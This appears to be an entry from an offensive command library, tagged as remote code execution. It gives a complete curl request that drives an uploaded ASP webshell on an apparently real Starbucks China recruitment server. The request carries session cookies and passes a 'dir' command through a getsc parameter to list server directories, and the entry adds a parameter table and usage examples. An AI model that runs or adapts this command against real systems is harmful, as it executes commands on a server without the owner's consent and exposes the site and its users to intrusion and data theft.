---
data: >-
  curl -i -s -k -X 'GET' -H 'Host: ecjobs.starbucks.com.cn' -H 'User-Agent:
  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101
  Firefox/63.0' -H 'Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H
  'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
  -H 'Accept-Encoding: gzip, deflate' -H 'Connection: close' -H 'Cookie:
  _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo;
  ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF;
  ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H 'Upgrade-Insecure-Requests:
  1' -b '_ga=GA1.3.779308870.1546486037;
  ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo;
  ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF;
  ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF'
  'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\TrustHX\STBKSERM101\www_app%20/d/s/b'
tags:
  - rce
  - webshell
type: command
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
id: 1a5154f0-3cea-45e8-80f2-236758036ec3
created_at: '2025-12-11T06:04:35.099Z'
updated_at: '2025-12-11T06:04:35.099Z'
verified: false
validated: true
submitted: true
---
# curl-execute-dir-command

## Command

```bash
curl -i -s -k -X 'GET' -H 'Host: ecjobs.starbucks.com.cn' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: close' -H 'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H 'Upgrade-Insecure-Requests: 1' -b '_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' 'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\TrustHX\STBKSERM101\www_app%20/d/s/b'
```

## Description

Executes a GET request to the uploaded webshell to run the 'dir' command and list files on the server, used to demonstrate OS command execution after webshell upload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Custom headers (Host, User-Agent, etc.) | Yes |
| `-b` | Cookie data | Yes |
| `-i` | Include protocol headers in the output | No |
| `-k` | Insecure, skip SSL verification | Yes |
| `-s` | Silent mode | No |
| `url` | The URL with ?getsc= parameter encoding the 'dir' command | Yes |
| `-X GET` | Specify request method | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -X 'GET' [headers] [url]
```

### Advanced Usage

```bash
curl -i -s -k -X 'GET' -H 'Host: example.com' [full headers and url]
```

## Expected Output

HTML response containing a textarea with directory listing from the server path.

## Related

- [[curl-execute-type-command]]
- [[Access Webshell and Execute OS Commands]]
